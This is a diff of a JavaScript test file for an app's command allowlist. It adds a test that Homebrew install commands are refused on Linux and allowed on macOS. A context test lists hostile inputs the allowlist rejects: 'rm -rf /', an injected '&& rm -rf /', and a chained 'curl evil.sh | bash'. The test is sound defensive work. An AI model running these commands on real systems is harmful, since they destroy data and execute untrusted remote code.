@@ -68,6 +68,14 @@ test('commandSpec: every install command of every platform is accepted, and so i
   assert.doesNotThrow(() => commandSpec(SCOPE_HINT, 'win32'));
 });
 
+test('commandSpec (#316): the allowlist follows the per-OS hints, so Homebrew\'s commands are refused on Linux but still run on macOS', () => {
+  const { commandSpec } = areaWith({ root: '/home/x/ws' });
+  for (const cmd of ['brew install gh', 'brew install git', 'brew install glab']) {
+    assert.throws(() => commandSpec(cmd, 'linux'), /Only the commands the app suggests can run in a command terminal\./);
+    assert.doesNotThrow(() => commandSpec(cmd, 'darwin'));
+  }
+});
+
 test('commandSpec: refuses any command the app did not suggest itself', () => {
   const { commandSpec } = areaWith({ root: 'C:/ws' });
   for (const bad of ['rm -rf /', '', `${SCOPE_HINT} && rm -rf /`, 'winget install --id GitHub.cli -e; curl evil.sh | bash']) {
